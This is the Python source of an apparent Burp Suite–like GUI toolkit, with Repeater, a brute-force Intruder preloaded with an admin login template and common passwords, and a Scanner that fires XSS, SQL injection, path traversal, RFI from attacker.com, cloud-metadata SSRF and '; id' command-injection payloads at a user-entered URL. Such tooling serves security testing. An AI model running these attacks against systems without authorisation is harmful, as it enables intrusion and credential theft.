import threading
import concurrent.futures
import base64
import html
import urllib.parse
import binascii
import re
import json
import os
import requests
import time
from datetime import datetime
from tkinter import ttk, scrolledtext, messagebox, filedialog
import tkinter as tk


def run_in_thread(func, *args):
    t = threading.Thread(target=func, args=args, daemon=True)
    t.start()
    return t


def _safe_update(widget, text):
    try:
        widget.config(state="normal")
        widget.delete("1.0", "end")
        widget.insert("1.0", text)
        widget.config(state="disabled")
    except Exception:
        pass

def _safe_append(widget, text):
    try:
        widget.config(state="normal")
        widget.insert("end", text)
        widget.see("end")
        widget.config(state="disabled")
    except Exception:
        pass



from mitmpro.ai_components import AIHelperTab
from mitmpro.common import ollama_models, register_model_listener
from mitmpro import common

class BurpPanel(ttk.Frame):
    def __init__(self, master):
        super().__init__(master)
        self.columnconfigure(0, weight=1)
        self.rowconfigure(1, weight=1)

        # ---- Header with Ollama model chooser (consistent with other AI panels)
        header = ttk.Frame(self)
        header.grid(row=0, column=0, sticky="ew", padx=4, pady=4)
        header.columnconfigure(2, weight=1)
        ttk.Label(header, text="Ollama Model:").grid(row=0, column=0, sticky="w")
        self.model = ttk.Combobox(header, width=24, state="readonly")
        self.model.grid(row=0, column=1, sticky="w")
        self.model.bind("<<ComboboxSelected>>",
                        lambda e: common.set_model(self.model.get()))
        ttk.Button(header, text="\u21bb", width=3,
                   command=self.load_models).grid(row=0, column=2, sticky="w", padx=2)
        ttk.Button(header, text="Refresh Models",
                   command=lambda: threading.Thread(
                       target=self.load_models, daemon=True).start()).grid(
                           row=0, column=3, sticky="w", padx=4)

        # ---- Inner notebook hosting the Burp sub-tools
        self.notebook = ttk.Notebook(self)
        self.notebook.grid(row=1, column=0, sticky="nsew", padx=2, pady=2)

        self.repeater = RepeaterPanel(self.notebook)
        self.intruder = IntruderPanel(self.notebook)
        self.decoder = DecoderPanel(self.notebook)
        self.comparer = ComparerPanel(self.notebook)
        self.sequencer = SequencerPanel(self.notebook)
        self.scanner = ScannerPanel(self.notebook)
        self.notebook.add(self.repeater, text="Repeater")
        self.notebook.add(self.intruder, text="Intruder")
        self.notebook.add(self.decoder, text="Decoder")
        self.notebook.add(self.comparer, text="Comparer")
        self.notebook.add(self.sequencer, text="Sequencer")
        self.notebook.add(self.scanner, text="Scanner")
        self.notebook.add(AIHelperTab(self.notebook, "Burp"), text="AI Helper")

        self.load_models()
        register_model_listener(self._on_global_model)

    def load_models(self):
        import threading
        def _fetch():
            try:
                models = ollama_models()
            except Exception:
                models = []
            try:
                self.after(0, lambda: self.model.config(values=models))
            except Exception:
                pass
            if models:
                sel = common.SELECTED_MODEL if common.SELECTED_MODEL in models else models[0]
                try:
                    self.after(0, lambda s=sel: self.model.set(s))
                except Exception:
                    pass
        threading.Thread(target=_fetch, daemon=True).start()

    def _on_global_model(self, model):
        def apply():
            if model and model in (self.model["values"] or ()):
                self.model.set(model)
        self.after(0, apply)

    def load_into_repeater(self, entry):
        self.repeater.load_from_entry(entry)
        self.notebook.select(self.repeater)


class RepeaterPanel(ttk.Frame):
    def __init__(self, master):
        super().__init__(master)
        self.columnconfigure(0, weight=1)
        self.rowconfigure(2, weight=1)
        self.rowconfigure(4, weight=1)
        self.rowconfigure(6, weight=1)

        top = ttk.Frame(self)
        top.grid(row=0, column=0, sticky="ew", padx=4, pady=4)
        top.columnconfigure(1, weight=1)
        ttk.Label(top, text="Method:").grid(row=0, column=0)
        self.method = ttk.Combobox(top, values=["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"], width=10)
        self.method.set("GET")
        self.method.grid(row=0, column=1, sticky="w")
        ttk.Label(top, text="URL:").grid(row=0, column=2)
        self.url = ttk.Entry(top)
        self.url.grid(row=0, column=3, sticky="ew")
        top.columnconfigure(3, weight=1)
        self.send_btn = ttk.Button(top, text="Send", command=lambda: run_in_thread(self.send))
        self.send_btn.grid(row=0, column=4)

        ttk.Label(self, text="Headers (Key: Value per line)").grid(row=1, column=0, sticky="w", padx=4)
        self.headers = scrolledtext.ScrolledText(self, height=4)
        self.headers.grid(row=2, column=0, sticky="nsew", padx=4)
        self.headers.insert("1.0", "User-Agent: MITMPro-Repeater/1.0\nAccept: */*")

        ttk.Label(self, text="Request Body").grid(row=3, column=0, sticky="w", padx=4)
        self.body = scrolledtext.ScrolledText(self, height=6)
        self.body.grid(row=4, column=0, sticky="nsew", padx=4)

        ttk.Label(self, text="Response").grid(row=5, column=0, sticky="w", padx=4)
        self.resp = scrolledtext.ScrolledText(self, height=10)
        self.resp.grid(row=6, column=0, sticky="nsew", padx=4)
        self.resp.config(state="disabled")

    def load_from_entry(self, entry):
        if isinstance(entry, dict):
            url = entry.get("url", "")
            method = entry.get("method", "GET")
            hdrs = entry.get("req_headers", {}) or {}
            body = entry.get("req_body") or ""
        else:
            url = getattr(entry, "url", "")
            method = getattr(entry, "method", "GET")
            hdrs = getattr(entry, "headers", {}) or {}
            body = getattr(entry, "body", "") or ""
        if not isinstance(hdrs, dict):
            hdrs = {}
        self.url.delete(0, "end")
        self.url.insert(0, url)
        self.method.set(method)
        hdr_text = "\n".join(f"{k}: {v}" for k, v in hdrs.items())
        self.headers.delete("1.0", "end")
        self.headers.insert("1.0", hdr_text or "User-Agent: MITMPro-Repeater/1.0\nAccept: */*")
        self.body.delete("1.0", "end")
        self.body.insert("1.0", body)

    def send(self):
        url = self.url.get().strip()
        if not url:
            return
        if not url.startswith(("http://", "https://")):
            url = "http://" + url
            self.after(0, lambda: self.url.delete(0, "end"))
            self.after(0, lambda u=url: self.url.insert(0, u))
        try:
            hdrs = {}
            for line in self.headers.get("1.0", "end").splitlines():
                if ":" in line:
                    k, v = line.split(":", 1)
                    hdrs[k.strip()] = v.strip()
            body = self.body.get("1.0", "end").strip("\n")
            method = self.method.get()
            kwargs = {"headers": hdrs, "timeout": 15, "verify": False, "allow_redirects": False}
            if method in ("POST", "PUT", "PATCH", "DELETE") and body:
                kwargs["data"] = body
            r = requests.request(method, url, **kwargs)
            out = f"HTTP/1.1 {r.status_code} {r.reason}\n"
            for k, v in r.headers.items():
                out += f"{k}: {v}\n"
            out += f"\n{len(r.content)} bytes\n\n"
            try:
                out += r.text
            except Exception:
                out += repr(r.content[:500])
            self.after(0, _safe_update, self.resp, out)
        except Exception as e:
            self.after(0, _safe_update, self.resp, f"Error: {e}")


class IntruderPanel(ttk.Frame):
    def __init__(self, master):
        super().__init__(master)
        self.columnconfigure(0, weight=1)
        self.rowconfigure(1, weight=1)
        self.rowconfigure(3, weight=1)
        self.rowconfigure(5, weight=1)

        ttk.Label(self, text="Request template — use §marker§ for injection points").grid(row=0, column=0, sticky="w", padx=4)
        self.tmpl = scrolledtext.ScrolledText(self, height=8)
        self.tmpl.grid(row=1, column=0, sticky="nsew", padx=4)
        self.tmpl.insert("1.0",
            "POST §url§/login HTTP/1.1\n"
            "Host: §host§\n"
            "Content-Type: application/x-www-form-urlencoded\n\n"
            "user=admin&pass=§pwd§")

        mid = ttk.Frame(self)
        mid.grid(row=2, column=0, sticky="ew", padx=4, pady=4)
        mid.columnconfigure(1, weight=1)
        ttk.Label(mid, text="Payloads (one per line):").grid(row=0, column=0, sticky="w")
        self.mode = ttk.Combobox(mid, values=["Sniper", "Cluster bomb"], width=12)
        self.mode.set("Sniper")
        self.mode.grid(row=0, column=2)
        self.run_btn = ttk.Button(mid, text="Start Attack", command=lambda: run_in_thread(self.attack))
        self.run_btn.grid(row=0, column=3)
        self.load_btn = ttk.Button(mid, text="Load Wordlist", command=self.load_wordlist)
        self.load_btn.grid(row=0, column=4)

        self.payloads = scrolledtext.ScrolledText(self, height=5)
        self.payloads.grid(row=3, column=0, sticky="nsew", padx=4)
        self.payloads.insert("1.0", "password123\nadmin\nletmein\nP@ssw0rd")

        ttk.Label(self, text="Results").grid(row=4, column=0, sticky="w", padx=4)
        self.results = scrolledtext.ScrolledText(self, height=8)
        self.results.grid(row=5, column=0, sticky="nsew", padx=4)
        self.results.config(state="disabled")

    def load_wordlist(self):
        p = filedialog.askopenfilename(title="Select wordlist")
        if p:
            try:
                with open(p, "r", errors="ignore") as f:
                    self.payloads.delete("1.0", "end")
                    self.payloads.insert("1.0", f.read())
            except Exception as e:
                messagebox.showerror("Error", str(e))

    def attack(self):
        tmpl = self.tmpl.get("1.0", "end")
        payloads = [line.strip() for line in self.payloads.get("1.0", "end").splitlines() if line.strip()]
        markers = re.findall(r"§([^§]+)§", tmpl)
        if not markers:
            self.after(0, lambda: messagebox.showerror("No markers", "Add §marker§ points to the template."))
            return
        
        self.after(0, lambda: _safe_update(self.results, ""))
        mode = self.mode.get()
        if mode == "Sniper":
            for i, p in enumerate(payloads):
                req = tmpl
                for m in markers:
                    req = req.replace(f"§{m}§", p)
                res = self._send_raw(req)
                self.after(0, _safe_append, self.results, f"[{i}] {p} -> {res}\n")
        else:
            import itertools
            for combo in itertools.product(payloads, repeat=len(markers)):
                req = tmpl
                for m, p in zip(markers, combo):
                    req = req.replace(f"§{m}§", p)
                res = self._send_raw(req)
                self.after(0, _safe_append, self.results, f"{combo} -> {res}\n")


    def _send_raw(self, raw):
        try:
            lines = raw.split("\n")
            req_line = lines[0]
            parts = req_line.split(" ", 2)
            if len(parts) < 2:
                return "MALFORMED REQUEST LINE"
            method = parts[0]
            path = parts[1]
            host = ""
            body = ""
            hdrs = {}
            in_body = False
            for ln in lines[1:]:
                if ln == "":
                    in_body = True
                    continue
                if in_body:
                    body += ln
                elif ":" in ln:
                    k, v = ln.split(":", 1)
                    if k.lower() == "host":
                        host = v.strip()
                    else:
                        hdrs[k.strip()] = v.strip()
            if not host:
                return "NO HOST"
            proto = "https" if ":443" in host else "http"
            url = f"{proto}://{host}{path}"
            r = requests.request(method, url, headers=hdrs, data=body, timeout=10, verify=False)
            return f"{r.status_code} ({len(r.content)}b)"
        except Exception as e:
            return f"ERR {e}"


class DecoderPanel(ttk.Frame):
    def __init__(self, master):
        super().__init__(master)
        self.columnconfigure(0, weight=1)
        self.rowconfigure(1, weight=1)
        self.rowconfigure(4, weight=1)

        ttk.Label(self, text="Input").grid(row=0, column=0, sticky="w", padx=4)
        self.inp = scrolledtext.ScrolledText(self, height=6)
        self.inp.grid(row=1, column=0, sticky="nsew", padx=4)
        self.inp.insert("1.0", "SGVsbG8gV29ybGQ=")

        ctl = ttk.Frame(self)
        ctl.grid(row=2, column=0, sticky="ew", padx=4, pady=4)
        self.fmt = ttk.Combobox(ctl, values=["Base64", "URL", "HTML", "Hex", "ASCII/HEX"], width=12)
        self.fmt.set("Base64")
        self.fmt.grid(row=0, column=0)
        ttk.Button(ctl, text="Encode", command=lambda: run_in_thread(self.encode)).grid(row=0, column=1)
        ttk.Button(ctl, text="Decode", command=lambda: run_in_thread(self.decode)).grid(row=0, column=2)

        ttk.Label(self, text="Output").grid(row=3, column=0, sticky="w", padx=4)
        self.out = scrolledtext.ScrolledText(self, height=6)
        self.out.grid(row=4, column=0, sticky="nsew", padx=4)
        self.out.config(state="disabled")

    def _get(self):
        return self.inp.get("1.0", "end").strip()

    def encode(self):
        data = self._get()
        fmt = self.fmt.get()
        try:
            if fmt == "Base64":
                res = base64.b64encode(data.encode()).decode()
            elif fmt == "URL":
                res = urllib.parse.quote(data)
            elif fmt == "HTML":
                res = html.escape(data)
            elif fmt == "Hex":
                res = binascii.hexlify(data.encode()).decode()
            else:
                res = " ".join(f"{ord(c):02X}" for c in data)
            self.after(0, _safe_update, self.out, res)
        except Exception as e:
            self.after(0, _safe_update, self.out, f"Error: {e}")

    def decode(self):
        data = self._get()
        fmt = self.fmt.get()
        try:
            if fmt == "Base64":
                res = base64.b64decode(data).decode("utf-8", "replace")
            elif fmt == "URL":
                res = urllib.parse.unquote(data)
            elif fmt == "HTML":
                res = html.unescape(data)
            elif fmt == "Hex":
                res = binascii.unhexlify(data.replace(" ", "")).decode("utf-8", "replace")
            else:
                res = "".join(chr(int(x, 16)) for x in data.split())
            self.after(0, _safe_update, self.out, res)
        except Exception as e:
            self.after(0, _safe_update, self.out, f"Error: {e}")


class ComparerPanel(ttk.Frame):
    def __init__(self, master):
        super().__init__(master)
        self.columnconfigure(0, weight=1)
        self.columnconfigure(1, weight=1)
        self.rowconfigure(1, weight=1)
        self.rowconfigure(3, weight=1)

        ttk.Label(self, text="Original").grid(row=0, column=0, sticky="w", padx=4)
        ttk.Label(self, text="Modified").grid(row=0, column=1, sticky="w", padx=4)
        self.a = scrolledtext.ScrolledText(self, height=8)
        self.b = scrolledtext.ScrolledText(self, height=8)
        self.a.grid(row=1, column=0, sticky="nsew", padx=4)
        self.b.grid(row=1, column=1, sticky="nsew", padx=4)

        ttk.Button(self, text="Compare (diff)", command=lambda: run_in_thread(self.compare)).grid(row=2, column=0, sticky="w", padx=4, pady=4)

        ttk.Label(self, text="Diff").grid(row=2, column=1, sticky="w", padx=4)
        self.diff = scrolledtext.ScrolledText(self, height=8)
        self.diff.grid(row=3, column=0, columnspan=2, sticky="nsew", padx=4)
        self.diff.config(state="disabled")

    def compare(self):
        import difflib
        a = self.a.get("1.0", "end").splitlines()
        b = self.b.get("1.0", "end").splitlines()
        diff = difflib.unified_diff(a, b, "original", "modified", lineterm="")
        out = "\n".join(diff) or "No differences."
        self.after(0, _safe_update, self.diff, out)


class SequencerPanel(ttk.Frame):
    def __init__(self, master):
        super().__init__(master)
        self.columnconfigure(0, weight=1)
        self.rowconfigure(1, weight=1)

        ttk.Label(self, text="Paste tokens (one per line) to analyze randomness").grid(row=0, column=0, sticky="w", padx=4)
        self.tokens = scrolledtext.ScrolledText(self, height=10)
        self.tokens.grid(row=1, column=0, sticky="nsew", padx=4)
        self.tokens.insert("1.0", "a1b2c3d4\ne5f6g7h8\ni9j0k1l2\nm3n4o5p6\nq7r8s9t0")

        ttk.Button(self, text="Analyze", command=lambda: run_in_thread(self.analyze)).grid(row=2, column=0, sticky="w", padx=4, pady=4)

        self.out = scrolledtext.ScrolledText(self, height=10)
        self.out.grid(row=3, column=0, sticky="nsew", padx=4)
        self.out.config(state="disabled")

    def analyze(self):
        toks = [l.strip() for l in self.tokens.get("1.0", "end").splitlines() if l.strip()]
        if len(toks) < 2:
            self.after(0, _safe_update, self.out, "Need at least 2 tokens.")
            return
        lens = [len(t) for t in toks]
        out = []
        out.append(f"Token count : {len(toks)}")
        out.append(f"Length min  : {min(lens)}  max: {max(lens)}  avg: {sum(lens)/len(lens):.1f}")
        maxlen = max(lens)
        position_entropy = []
        for i in range(maxlen):
            col = [t[i] for t in toks if i < len(t)]
            if not col:
                continue
            freq = {}
            for c in col:
                freq[c] = freq.get(c, 0) + 1
            n = len(col)
            ent = -sum((v / n) * (__import__("math").log2(v / n)) for v in freq.values())
            position_entropy.append((i, ent, len(freq)))
        out.append("\nPer-position entropy (bits, distinct chars):")
        for i, ent, d in position_entropy:
            out.append(f"  pos {i:2d}: entropy={ent:.2f}  unique_chars={d}")
        overall = "".join(toks)
        from collections import Counter
        cnt = Counter(overall)
        tot = len(overall)
        oent = -sum((v / tot) * __import__("math").log2(v / tot) for v in cnt.values())
        out.append(f"\nOverall character entropy: {oent:.2f} bits (max {__import__('math').log2(len(cnt)):.2f})")
        out.append("\nNote: entropy near log2(unique) suggests high randomness.")
        self.after(0, _safe_update, self.out, "\n".join(out))


class ScannerPanel(ttk.Frame):
    def __init__(self, master):
        super().__init__(master)
        self.columnconfigure(0, weight=1)
        self.rowconfigure(3, weight=1)
        self._scan_history = []
        self._seen = set()
        self._seen_lock = threading.Lock()

        top = ttk.Frame(self)
        top.grid(row=0, column=0, sticky="ew", padx=4, pady=4)
        top.columnconfigure(1, weight=1)
        ttk.Label(top, text="Target URL:").grid(row=0, column=0)
        self.url = ttk.Entry(top)
        self.url.grid(row=0, column=1, sticky="ew")
        self.scan_btn = ttk.Button(top, text="Scan", command=lambda: run_in_thread(self.scan))
        self.scan_btn.grid(row=0, column=2, padx=4)
        ttk.Button(top, text="Export Report", command=self.export_report).grid(row=0, column=3, padx=4)
        ttk.Button(top, text="Scan History", command=self.show_history).grid(row=0, column=4, padx=4)

        self.checks = {
            "Reflected XSS": tk.BooleanVar(value=True),
            "SQL Injection": tk.BooleanVar(value=True),
            "Open Redirect": tk.BooleanVar(value=True),
            "LFI/RFI": tk.BooleanVar(value=True),
            "SSRF": tk.BooleanVar(value=True),
            "Command Injection": tk.BooleanVar(value=True),
            "Sensitive Files": tk.BooleanVar(value=True),
            "CSRF Check": tk.BooleanVar(value=True),
            "Header Security": tk.BooleanVar(value=True),
            "Directory Busting": tk.BooleanVar(value=True),
            "CORS Misconfig": tk.BooleanVar(value=True),
            "Cookie Security": tk.BooleanVar(value=True),
            "SSL/TLS Info": tk.BooleanVar(value=True),
            "JWT Analysis": tk.BooleanVar(value=True),
        }

        chk = ttk.Frame(self)
        chk.grid(row=1, column=0, sticky="w", padx=4)
        c = 0
        for name, var in self.checks.items():
            ttk.Checkbutton(chk, text=name, variable=var).grid(row=c // 7, column=c % 7)
            c += 1

        self._progress_lbl = ttk.Label(self, text="")
        self._progress_lbl.grid(row=2, column=0, sticky="w", padx=4)

        ttk.Label(self, text="Findings").grid(row=2, column=1, sticky="e", padx=4)
        self.out = scrolledtext.ScrolledText(self, height=10)
        self.out.grid(row=3, column=0, sticky="nsew", padx=4)
        self.out.config(state="disabled")
        self._last_findings = []
        self._last_meta = {}

    def _inject(self, url, param, payload):
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        p = urlparse(url)
        q = parse_qs(p.query)
        q[param] = payload
        new = p._replace(query=urlencode(q, doseq=True))
        return urlunparse(new)

    def _update_progress(self, text):
        self.after(0, lambda: self._progress_lbl.config(text=text))

    def scan(self):
        base = self.url.get().strip()
        if not base:
            return
        self._seen.clear()
        self._last_findings = []
        findings = []
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
        self._update_progress("Fetching target...")
        try:
            r = requests.get(base, timeout=15, verify=False, headers=headers)
        except Exception as e:
            self.after(0, _safe_update, self.out, f"Cannot fetch target: {e}")
            self._update_progress("")
            return

        try:
            from bs4 import BeautifulSoup
        except ImportError:
            self.after(0, _safe_update, self.out, "BeautifulSoup (bs4) is not installed. Run: pip install beautifulsoup4")
            self._update_progress("")
            return
        soup = BeautifulSoup(r.text, "html.parser")
        forms = soup.find_all("form")
        params = list(urllib.parse.parse_qs(urllib.parse.urlparse(base).query).keys())
        for f in forms:
            for inp in f.find_all("input"):
                n = inp.get("name")
                if n:
                    params.append(n)
        param_set = set(params)
        parsed_url = urllib.parse.urlparse(base)

        enabled_checks = [name for name, var in self.checks.items() if var.get()]
        total = len(enabled_checks)

        def _do_check(check_name):
            results = []
            if check_name == "Reflected XSS":
                payload = "<script>alert(1)</script>"
                for pname in param_set:
                    test = self._inject(base, pname, payload)
                    try:
                        rr = requests.get(test, timeout=10, verify=False, headers=headers)
                        if payload in rr.text:
                            results.append({"severity": "HIGH", "text": f"[HIGH] Reflected XSS via param '{pname}'", "param": pname})
                    except Exception:
                        pass

            elif check_name == "SQL Injection":
                payloads = ["' OR '1'='1", "'; WAITFOR DELAY '0:0:5'--", "') OR 1=1--"]
                for pname in param_set:
                    for p in payloads:
                        test = self._inject(base, pname, p)
                        try:
                            start = time.time()
                            rr = requests.get(test, timeout=15, verify=False, headers=headers)
                            if (time.time() - start > 4) or any(x in rr.text.lower() for x in ["sql", "syntax", "mysql", "postgresql", "oracle"]):
                                results.append({"severity": "HIGH", "text": f"[HIGH] Possible SQLi via param '{pname}' using {p}", "param": pname})
                                break
                        except Exception:
                            pass

            elif check_name == "Open Redirect":
                payload = "http://evil.com"
                for pname in param_set:
                    test = self._inject(base, pname, payload)
                    try:
                        rr = requests.get(test, timeout=10, verify=False, headers=headers, allow_redirects=False)
                        if rr.status_code in (301, 302) and payload in rr.headers.get("Location", ""):
                            results.append({"severity": "MEDIUM", "text": f"[MEDIUM] Open Redirect via param '{pname}'", "param": pname})
                    except Exception:
                        pass

            elif check_name == "LFI/RFI":
                payloads = ["../../../../etc/passwd", "http://attacker.com/shell.txt", "/etc/passwd"]
                for pname in param_set:
                    for p in payloads:
                        test = self._inject(base, pname, p)
                        try:
                            rr = requests.get(test, timeout=10, verify=False, headers=headers)
                            if "root:x:0:0" in rr.text or "shell.txt" in rr.text:
                                results.append({"severity": "HIGH", "text": f"[HIGH] LFI/RFI via param '{pname}' using {p}", "param": pname})
                                break
                        except Exception:
                            pass

            elif check_name == "SSRF":
                payloads = ["http://169.254.169.254/latest/meta-data/", "http://localhost:80", "http://127.0.0.1:22"]
                for pname in param_set:
                    for p in payloads:
                        test = self._inject(base, pname, p)
                        try:
                            rr = requests.get(test, timeout=10, verify=False, headers=headers)
                            if any(x in rr.text for x in ["instance-id", "SSH-2.0", "root:x:0:0"]):
                                results.append({"severity": "HIGH", "text": f"[HIGH] SSRF via param '{pname}' using {p}", "param": pname})
                                break
                        except Exception:
                            pass

            elif check_name == "Command Injection":
                payloads = ["; id", "| id", "$(id)", "`id`"]
                for pname in param_set:
                    for p in payloads:
                        test = self._inject(base, pname, p)
                        try:
                            rr = requests.get(test, timeout=10, verify=False, headers=headers)
                            if "uid=" in rr.text and "gid=" in rr.text:
                                results.append({"severity": "CRITICAL", "text": f"[CRITICAL] Command Injection via param '{pname}' using {p}", "param": pname})
                                break
                        except Exception:
                            pass

            elif check_name == "Sensitive Files":
                paths = ["/.git/config", "/.env", "/phpinfo.php", "/robots.txt", "/.htaccess", "/wp-config.php", "/server-status", "/.DS_Store", "/WEB-INF/web.xml", "/sitemap.xml"]
                root_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
                for p in paths:
                    try:
                        rr = requests.get(root_url + p, timeout=10, verify=False, headers=headers)
                        if rr.status_code == 200:
                            if any(x in rr.text for x in ["repository", "DB_PASSWORD", "PHP Version", "User-agent", "Disallow", "web-app"]):
                                results.append({"severity": "MEDIUM", "text": f"[MEDIUM] Sensitive file exposed: {p}", "param": p})
                    except Exception:
                        pass

            elif check_name == "CSRF Check":
                for form in forms:
                    has_token = False
                    for inp in form.find_all("input"):
                        name = inp.get("name", "").lower()
                        if any(x in name for x in ["csrf", "token", "xsrf", "auth"]):
                            has_token = True
                            break
                    if not has_token:
                        results.append({"severity": "LOW", "text": f"[LOW] Potential CSRF in form action '{form.get('action', 'N/A')}'", "param": "form"})

            elif check_name == "Header Security":
                sec_headers = {
                    "content-security-policy": "Missing CSP",
                    "strict-transport-security": "Missing HSTS",
                    "x-frame-options": "Missing X-Frame-Options (clickjacking risk)",
                    "x-content-type-options": "Missing X-Content-Type-Options",
                    "x-xss-protection": "Missing X-XSS-Protection",
                    "referrer-policy": "Missing Referrer-Policy",
                }
                for hdr, desc in sec_headers.items():
                    if hdr not in {k.lower() for k in r.headers}:
                        sev = "MEDIUM" if hdr in ("content-security-policy", "strict-transport-security") else "LOW"
                        results.append({"severity": sev, "text": f"[{sev}] {desc}", "param": "headers"})

            elif check_name == "Directory Busting":
                dirs = ["/admin", "/backup", "/config", "/api", "/.git", "/phpmyadmin", "/login", "/dashboard", "/debug", "/test", "/staging", "/.env.bak", "/wp-admin", "/server-info", "/cpanel"]
                root_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
                for d in dirs:
                    try:
                        rr = requests.get(root_url + d, timeout=8, verify=False, headers=headers, allow_redirects=False)
                        if rr.status_code == 200 and len(rr.text) > 100:
                            results.append({"severity": "MEDIUM", "text": f"[MEDIUM] Directory found: {d} (HTTP 200)", "param": d})
                        elif rr.status_code in (301, 302, 401, 403):
                            results.append({"severity": "INFO", "text": f"[INFO] Path responded {rr.status_code}: {d}", "param": d})
                    except Exception:
                        pass

            elif check_name == "CORS Misconfig":
                test_origins = ["https://evil.com", "https://attacker.com", f"{parsed_url.scheme}://{parsed_url.netloc}"]
                for origin in test_origins:
                    try:
                        rr = requests.get(base, timeout=10, verify=False, headers={**headers, "Origin": origin})
                        acao = rr.headers.get("Access-Control-Allow-Origin", "")
                        acac = rr.headers.get("Access-Control-Allow-Credentials", "")
                        if acao == "*" or (acao == origin and acac.lower() == "true"):
                            severity = "HIGH" if acac.lower() == "true" else "MEDIUM"
                            results.append({"severity": severity, "text": f"[{severity}] CORS: ACAO={acao} ACAC={acac} (Origin: {origin})", "param": "cors"})
                            break
                    except Exception:
                        pass

            elif check_name == "Cookie Security":
                for hdr_val in r.headers.get("Set-Cookie", "").split(","):
                    cookie_part = hdr_val.split(";")[0].strip()
                    if not cookie_part:
                        continue
                    lower = hdr_val.lower()
                    flags = []
                    if "httponly" not in lower:
                        flags.append("HttpOnly")
                    if "secure" not in lower:
                        flags.append("Secure")
                    if "samesite" not in lower:
                        flags.append("SameSite")
                    if flags:
                        results.append({"severity": "LOW", "text": f"[LOW] Cookie '{cookie_part.split('=')[0]}' missing: {', '.join(flags)}", "param": "cookie"})

            elif check_name == "SSL/TLS Info":
                if parsed_url.scheme == "http":
                    results.append({"severity": "INFO", "text": "[INFO] Target uses HTTP (not HTTPS) — traffic is unencrypted", "param": "ssl"})

            elif check_name == "JWT Analysis":
                import base64 as b64
                for cookie_val in r.headers.get("Set-Cookie", "").split(","):
                    for part in cookie_val.split(";"):
                        kv = part.strip().split("=", 1)
                        if len(kv) == 2:
                            v = kv[1].strip()
                            segments = v.split(".")
                            if len(segments) == 3:
                                try:
                                    b64url_decode = lambda s: b64.urlsafe_b64decode(s + "=" * (4 - len(s) % 4))
                                    b64url_decode(segments[0])
                                    b64url_decode(segments[1])
                                    results.append({"severity": "INFO", "text": f"[INFO] JWT detected in cookie '{kv[0].strip()}' — review for weak algo (none/HS256)", "param": "jwt"})
                                except Exception:
                                    pass
                for pname in param_set:
                    val = urllib.parse.parse_qs(urllib.parse.urlparse(base).query).get(pname, [""])[0]
                    if val and len(val.split(".")) == 3:
                        results.append({"severity": "INFO", "text": f"[INFO] JWT-like value in param '{pname}'", "param": "jwt"})

            return check_name, results

        all_findings = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
            futures = {ex.submit(_do_check, name): name for name in enabled_checks}
            done_count = 0
            for fut in concurrent.futures.as_completed(futures):
                done_count += 1
                name = futures.get(fut, "?")
                try:
                    check_name, results = fut.result()
                except Exception as e:
                    results = [{"severity": "INFO", "text": f"[INFO] Check '{name}' error: {e}", "param": ""}]
                    check_name = name
                self._update_progress(f"Running: {name} ({done_count}/{total})")
                for r in results:
                    key = (r["text"], r.get("param", ""))
                    with self._seen_lock:
                        if key not in self._seen:
                            self._seen.add(key)
                            all_findings.append(r)

        self._update_progress("")
        severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
        all_findings.sort(key=lambda f: severity_order.get(f["severity"], 5))

        result_lines = [f"Scanned {base}  |  Forms: {len(forms)}  |  Params: {len(param_set)}",
                        f"Checks: {total}  |  Findings: {len(all_findings)}  |  Time: {datetime.now():%H:%M:%S}", ""]
        for f_item in all_findings:
            result_lines.append(f_item["text"])
        if not all_findings:
            result_lines.append("No vulnerabilities detected in passive/light checks.")

        result = "\n".join(result_lines)
        self._last_findings = all_findings
        self._last_meta = {"target": base, "forms": len(forms), "params": len(param_set),
                           "checks": total, "time": datetime.now().isoformat(),
                           "findings": all_findings}
        self._scan_history.append(self._last_meta)
        if len(self._scan_history) > 10:
            self._scan_history.pop(0)
        self.after(0, _safe_update, self.out, result)

    def export_report(self):
        if not self._last_meta:
            messagebox.showinfo("Info", "Run a scan first to generate a report.")
            return
        p = filedialog.asksaveasfilename(defaultextension=".json", title="Export Scan Report",
                                         filetypes=[("JSON", "*.json")])
        if p:
            try:
                with open(p, "w") as f:
                    json.dump(self._last_meta, f, indent=2, default=str)
                messagebox.showinfo("Exported", f"Report saved to {p}")
            except Exception as e:
                messagebox.showerror("Error", str(e))

    def show_history(self):
        if not self._scan_history:
            messagebox.showinfo("History", "No scan history yet.")
            return
        lines = []
        for i, h in enumerate(self._scan_history[-10:], 1):
            lines.append(f"{i}. {h['time']}  {h['target']}  findings={len(h['findings'])}")
        messagebox.showinfo("Scan History", "\n".join(lines))

